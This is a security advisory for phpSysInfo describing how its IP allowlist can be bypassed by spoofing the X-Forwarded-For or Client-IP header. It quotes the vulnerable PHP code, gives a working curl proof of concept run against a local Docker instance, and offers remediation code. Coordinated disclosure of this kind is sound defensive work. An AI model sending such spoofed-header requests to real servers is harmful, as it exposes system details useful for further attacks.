# [H] phpSysInfo has an IP allowlist (PSI_ALLOWED) bypass via spoofed X-Forwarded-For / Client-IP headers

## Summary
Severity: High
Advisory: GHSA-786w-p5pm-cvgh
CVE: CVE-2026-55584
CWE: CWE-290
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2026-08-28
Source: https://github.com/advisories/GHSA-786w-p5pm-cvgh
Type: github-advisory

## Affected
- Packagist: `phpsysinfo/phpsysinfo` — affected >=0 <3.4.6

## Details
## Summary
phpSysInfo's `PSI_ALLOWED` IP allowlist can be trivially bypassed by any unauthenticated remote attacker. The access-control check in `read_config.php` derives the client IP from the attacker-controlled `X-Forwarded-For` and `Client-IP` HTTP headers **before** falling back to `REMOTE_ADDR`. An attacker can send `X-Forwarded-For: <an allowed IP>` to impersonate a trusted address and gain full access to all exposed system information, defeating the only IP-based access restriction the application provides.

## Affected component
- File: `read_config.php`
- Versions: all versions up to and including 3.4.x (current `main`)

## Description
When `PSI_ALLOWED` is configured, `read_config.php` enforces an IP allowlist. The client IP is resolved as follows:

```php
if (isset($_SERVER["HTTP_X_FORWARDED_FOR"])) {
    $ip = $_SERVER["HTTP_X_FORWARDED_FOR"];
} else {
    if (isset($_SERVER["HTTP_CLIENT_IP"])) {
        $ip = $_SERVER["HTTP_CLIENT_IP"];
    } else {
        $ip = $_SERVER["REMOTE_ADDR"];
    }
}
```

Both `HTTP_X_FORWARDED_FOR` and `HTTP_CLIENT_IP` are fully attacker-controlled request headers. They are trusted unconditionally and take priority over `REMOTE_ADDR`. There is no concept of a configured/trusted reverse proxy, so even when phpSysInfo is exposed directly (no proxy in front), the spoofed header wins. As a result the allowlist provides no real protection.

## Proof of Concept
Verified against phpSysInfo `3.4.x-main-d786ab2` running in a local Docker container (`php:8.2-apache`).

Deployment with the allowlist (under `[main]`) restricted to an address the attacker does not own:

```ini
; phpsysinfo.ini  ([main] section)
ALLOWED=8.8.8.8
```

Request without the spoofed header — correctly denied (attacker's real IP is the container gateway `172.17.0.1`):

```bash
$ curl -s http://localhost:8080/xml.php | head -c 200
Client IP address (172.17.0.1) not allowed.
```

Request with a spoofed `X-Forwarded-For` matching the allowlist — bypass, full system information returned:

```bash
$ curl -s -H "X-Forwarded-For: 8.8.8.8" http://localhost:8080/xml.php | head -c 200
<?xml version="1.0" encoding="UTF-8"?>
<tns:phpsysinfo xmlns:tns="http://phpsysinfo.sourceforge.net/" ...>
```

The same bypass works with the `Client-IP` header (`HTTP_CLIENT_IP`), which is also trusted before `REMOTE_ADDR`.

## Impact
Any remote, unauthenticated attacker can defeat the `PSI_ALLOWED` access restriction and read the complete system information exposed by phpSysInfo, including hostname, kernel version, CPU model, memory layout, mounted filesystems, and all network interface addresses. This information is valuable for reconnaissance and targeting of further attacks.

## Remediation
Use `REMOTE_ADDR` as the authoritative client IP by default. Only honor `X-Forwarded-For` / `Client-IP` when the request originates from an explicitly configured list of trusted proxies, and when honoring it, parse the correct entry from the chain rather than trusting the whole header. Example direction:

```php
$ip = $_SERVER["REMOTE_ADDR"];
if (defined('PSI_TRUSTED_PROXIES') && in_array($ip, $trusted_proxies, true)
    && isset($_SERVER["HTTP_X_FORWARDED_FOR"])) {
    // take the right-most untrusted hop from the XFF chain
    $parts = array_map('trim', explode(',', $_SERVER["HTTP_X_FORWARDED_FOR"]));
    $ip = end($parts);
}
```

## Discovery / Credit
- Reported by: Muhammed Mirac Kayıkci
- Coordinated disclosure; no third-party systems were tested. Verification performed against a local Docker deployment only.

## References
- https://github.com/phpsysinfo/phpsysinfo/security/advisories/GHSA-786w-p5pm-cvgh
- https://github.com/phpsysinfo/phpsysinfo/commit/019fa2d7e568ea11461adb4bd33da5dc87c4b9ab
- https://github.com/phpsysinfo/phpsysinfo
- https://github.com/phpsysinfo/phpsysinfo/releases/tag/v3.4.6
